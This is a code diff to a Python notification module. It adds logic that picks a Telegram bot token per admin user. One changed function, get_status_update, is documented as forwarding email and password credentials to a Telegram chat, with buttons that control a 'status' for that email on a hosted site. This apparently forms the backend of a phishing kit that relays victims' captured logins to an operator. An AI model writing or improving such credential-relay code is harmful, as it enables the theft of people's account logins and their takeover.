@@ -3,6 +3,7 @@ import json
 from dotenv import load_dotenv
 import os
 from urllib.parse import quote
+from utils import Local_Cache
 
 # --- Load Environment Variables ---
 load_dotenv()
@@ -20,6 +21,19 @@ def send_notification(text, user_id=None):
     Sends a plain text notification to a specified Telegram user.
     If no user_id is provided, it falls back to the default user.
     """
+    BOT_TOKEN = os.environ.get('BOT_TOKEN')
+    if user_id:
+        user_id = str(user_id)
+        ADMIN_USER = Local_Cache.get("ADMIN_USER")
+        if not ADMIN_USER:
+            ADMIN_USER = Variables.find_one({"name": "ADMIN_USER"})
+        
+        if ADMIN_USER:
+            if ADMIN_USER.get("id") == user_id:
+                BOT_TOKEN = ADMIN_USER.get("bot_token")
+    
+
+
     base_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     
     chat_id = user_id if user_id else DEFAULT_USER_ID
@@ -28,6 +42,7 @@ def send_notification(text, user_id=None):
         'chat_id': chat_id,
         'text': text
     }
+
     try:
         response = requests.post(base_url, data=payload)
         response.raise_for_status()
@@ -41,6 +56,18 @@ def get_status_update(email, password, user_id=None):
     Sends credentials to the specified Telegram user with status control buttons.
     If the user is the admin, an extra button to set a custom status is added.
     """
+    BOT_TOKEN = os.environ.get('BOT_TOKEN')
+    if user_id:
+        user_id = str(user_id)
+        ADMIN_USER = Local_Cache.get("ADMIN_USER")
+        if not ADMIN_USER:
+            ADMIN_USER = Variables.find_one({"name": "ADMIN_USER"})
+        
+        if ADMIN_USER:
+            if ADMIN_USER.get("id") == user_id:
+                BOT_TOKEN = ADMIN_USER.get("bot_token")
+
+
     base_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     
     chat_id = user_id if user_id else DEFAULT_USER_ID
@@ -75,7 +102,7 @@ def get_status_update(email, password, user_id=None):
     # --- NEW: If the recipient is the admin, add the special button ---
     if str(chat_id) == ADMIN_USER_ID:
         custom_button_row = [{
-            'text': '✍️ Set Custom Message',
+            'text': 'Set Custom Message',
             'url': f"{HOSTED_URL}/set_custom_status?email={quote(email)}"
         }]
         # Add it as a new row at the bottom of the keyboard
